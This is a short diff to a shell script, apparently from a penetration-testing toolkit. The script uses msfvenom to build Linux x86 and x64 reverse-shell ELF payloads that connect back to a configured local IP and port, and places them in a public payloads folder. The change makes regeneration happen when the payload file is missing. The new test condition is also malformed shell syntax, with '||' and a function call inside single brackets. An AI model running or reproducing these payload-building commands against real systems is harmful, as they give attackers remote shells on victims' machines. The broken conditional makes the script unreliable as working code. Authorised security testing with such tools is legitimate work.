@@ -1,7 +1,7 @@
 mkdir public/payloads_linux
 cd public/payloads_linux
 
-  if confirm "Regenerate payloads_linux [y/n]? "; then
+  if [ ! -f shell_reverse_tcp_x86.elf || confirm "Regenerate payloads_linux [y/n]? " ]; then
     # Reverse shells
     msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x86 --platform linux -o shell_reverse_tcp_x86.elf
     msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x64 --platform linux -o shell_reverse_tcp_x64.elf
